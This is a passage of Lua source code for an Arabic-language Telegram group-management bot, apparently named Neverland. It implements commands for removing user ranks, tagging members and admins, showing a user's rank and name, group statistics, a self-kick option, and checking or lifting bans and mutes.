if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if DevNeverlande(result.sender_user_id_)  then
send(msg.chat_id_, msg.id_,"✦┇لا تستطيع تنزيل مطور البوت او السورس")
return false 
end
if database:sismember(bot_id.."Neverland:Sudo:User", result.sender_user_id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, result.sender_user_id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_) then
vip = "مميز ،" else vip = ""
end
if Rank_Checking(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n✦┇تم تنزيل الشخص من الرتب التاليه \n✦┇ { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n✦┇ليس لديه رتب حتى استطيع تنزيله \n")
end
if DevNeverlande(msg.sender_user_id_)  then
database:srem(bot_id.."DEV:Sudo:T",result.sender_user_id_)
database:srem(bot_id.."Neverland:Sudo:User", result.sender_user_id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."DEV:Sudo:T",msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Sudo:User", result.sender_user_id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Neverland:Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id.."creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Neverland:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Neverland:Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
end
if text and text:match("^تنزيل الكل @(.*)$") and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if (result.id_) then
if DevNeverlande(result.id_)  then
send(msg.chat_id_, msg.id_,"✦┇لا تستطيع تنزيل مطور البوت او السورس")
return false 
end
if Rank_Checking(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n✦┇تم تنزيل الشخص من جميع الرتب")
else
send(msg.chat_id_, msg.id_,"\n✦┇ليس لديه رتب حتى استطيع تنزيله \n")
end
if DevNeverlande(msg.sender_user_id_)  then
database:srem(bot_id.."DEV:Sudo:T",result.id_)
database:srem(bot_id.."Neverland:Sudo:User", result.id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."DEV:Sudo:T",msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Sudo:User", result.id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Neverland:Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Neverland:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Neverland:Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, Function_Neverland, nil)
end
if text == "@all" or text == "all" and BasicConstructor(msg) then   
if database:get(bot_id.."chat:tagall"..msg.chat_id_) then  return send(msg.chat_id_, msg.id_,"يمكنك عمل تاك للكل كل *10 دقائق* فقط") end
database:setex(bot_id..'chat:tagall'..msg.chat_id_,600,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_
},function(ta,Neverland)
x = 0
tags = 0
local list = Neverland.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "*#all*"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end,nil)
end
if text == ("تاك للكل") and Addictive(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*\n> عذࢪاَ يڪلبي\n> عليڪ الاشتࢪاڪ في قناه البوت\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,Neverland)
local t = "\n*✦┇قائمة الاعضاء \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*"
x = 0
local list = Neverland.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
x = x + 1
if data.username_ then
t = t.."*"..x.." ↞* [@"..data.username_.."] \n"
end
if k == 0 then
t = t.."*يمكنك عمل تاك  + العدد مثال تاك ل 5*"
send(msg.chat_id_,msg.id_,t)
end
end,nil)
end
end,nil)
end
if text and text:match("^تاك ل (%d+)$") and Addictive(msg) then   
taglimit = text:match("^تاك ل (%d+)$"):gsub('تاك ل ','')
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = taglimit
},function(ta,Neverland)
local t = "\n*✦┇قائمة الاعضاء \n ┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*"
x = 0
local list = Neverland.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
x = x + 1
if data.username_ then
t = t.."*"..x.." ↞* [@"..data.username_.."] \n"
else
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.."*"..x.." ↞* [@"..database:get(bot_id.."Neverland:User:Name"..v.user_id_).."]\n"
end
if k == 0 then
send(msg.chat_id_,msg.id_,t)
end
end,nil)
end
end,nil)
end
if text == "تاك للمشرفين" or text == "admin" and DevBot(msg) and not database:get(bot_id..'tgg:bot:api'..msg.chat_id_) then            
if database:get(bot_id.."Neverland:admin:Time"..msg.chat_id_) then 
return
 send(msg.chat_id_, msg.id_,"✦┇انتظر دقيقه من فضلك")
end
database:setex(bot_id.."Neverland:admin:Time"..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100 },function(extra,result,success)
m = 0
tgad = 0
local ans = result.members_  
for k, v in pairs(ans) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if m == 1 or m == tgad or k == 0 then
tgad = m + 5
t = "#Admin"
end
m = m + 1
Adminame = data.first_name_
Adminame = Adminame:gsub("]","")
Adminame = Adminame:gsub("[[]","")
t = t..", ["..Adminame.."](tg://user?id="..v.user_id_..")"
if m == 1 or m == tgad or k == 0 then
local Text = t:gsub('#Admin,','#Admin\n')
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end
if text == "رتبتي" then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local rtp = Get_Rank(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,"*✦┇رتبتك في البوت* "..rtp)
end
if text == "اسمي"  then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = "✦┇اسمك الاول ↜ {`"..(result.first_name_).."`}"
else
first_name = ""
end   
if result.last_name_ then 
last_name = "✦┇اسمك الثاني ↜ {`"..result.last_name_.."`}" 
else
last_name = ""
end      
send(msg.chat_id_, msg.id_,first_name.."\n"..last_name) 
end,nil)
end 
if text==("عدد الكروب") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"✦┇البوت ليس ادمن هنا \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
local Alsh = "✦┇عدد الادمنيه : "..data.administrator_count_..
"\n✦┇عدد المطرودين : "..data.kicked_count_..
"\n✦┇عدد الاعضاء : "..data.member_count_..
"\n✦┇عدد رسائل الكروب : "..(msg.id_/2097152/0.5)..
"\n✦┇اسم المجموعه : ["..ta.title_.."]"
send(msg.chat_id_, msg.id_, Alsh) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طردني' then   
if not database:get(bot_id.."Neverland:Kick:Me"..msg.chat_id_) then
if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n *✦┇عذرا لا استطيع طرد ( '..Get_Rank(msg.sender_user_id_,msg.chat_id_)..' )*')
return false
end
_key = {
{{text="تأكيد الامر",callback_data="OkKikedMe"..msg.sender_user_id_},{text="الغاء الامر",callback_data="noKikedMe"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_," *✦┇قم بتأكيد العمليه الان*",_key,msg.id_)
return false
else
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل امر اطردني*') 
end
end

if text == "تفعيل اطردني" and Owner(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Kick:Me"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تعطيل اطردني" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Kick:Me"..msg.chat_id_,true)  
Text = "\n✦┇تم تعطيل امر اطردني"
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'✦┇المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'✦┇لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'✦┇لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'✦┇لا اسطيع صيح معرفات المجموعات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,'✦┇تعال حبي يصيحونك بل كروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'✦┇تم تعطيل امر صيح') 
end
return false
end

if text == 'منو ضافني' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'✦┇انت منشئ المجموعه') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '✦┇الشخص الذي قام باضافتك هو » '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'✦┇انت دخلت عبر الرابط لتلح') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'✦┇تم تعطيل امر منو ضافني') 
end
end

if text == 'تفعيل ضافني' and Owner(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل امر تنزيل ضافني مسبقا')
else
database:del(bot_id..'Added:Me'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل امر تنزيل ضافني')
end
end
if text == 'تعطيل ضافني' and Owner(msg) then   
if (database:get(bot_id..'Added:Me'..msg.chat_id_) == 'true') then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل امر تنزيل ضافني مسبقا')
else
database:set(bot_id..'Added:Me'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل امر تنزيل ضافني')
end
end
if text == 'تفعيل صيح' and Owner(msg) then   
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل امر تنزيل صيح مسبقا')
else
database:del(bot_id..'Seh:User'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل امر تنزيل صيح')
end
end
if text == 'تعطيل صيح' and Owner(msg) then   
if (database:get(bot_id..'Seh:User'..msg.chat_id_) == 'true') then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل امر تنزيل صيح مسبقا')
else
database:set(bot_id..'Seh:User'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل امر تنزيل صيح')
end
end

if text and text:match("^رفع القيود @(.*)") and Owner(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع القيود @(.*)") 
function Function_Neverland(extra, result, success)
if result.id_ then
if DevNeverland(msg) then
database:srem(bot_id.."Neverland:GBan:User",result.id_)
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.id_)
usertext = "\n✦┇العضو ↜ ["..result.title_.."](t.me/"..(username or "kenwa")..")"
status  = "\n✦┇تم الغاء القيود عنه"
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.id_)
Reply_Status(msg,result.id_,"reply","\n✦┇تم الغاء القيود عنه")  
end
else
Text = "✦┇المعرف غلط"
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
end
if text == "رفع القيود" and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if DevNeverland(msg) then
database:srem(bot_id.."Neverland:GBan:User",result.sender_user_id_)
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","\n✦┇تم الغاء القيود عنه")  
else
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = "\n✦┇العضو ↜ ["..data.first_name_.."](t.me/"..(data.username_ or "kenwa")..")"
status  = "\n✦┇تم الغاء القيود عنه"
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
end
if text and text:match("^كشف القيود @(.*)") and Owner(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^كشف القيود @(.*)") 
function Function_Neverland(extra, result, success)
if result.id_ then
if database:sismember(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if database:sismember(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if database:sismember(bot_id.."Neverland:GBan:User",result.id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
send(msg.chat_id_, msg.id_,"✦┇الحظر العام ↜ "..GBan.."\n✦┇الحظر ↜ "..Ban.."\n✦┇الكتم ↜ "..Muted)
else
send(msg.chat_id_, msg.id_,"✦┇المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
end

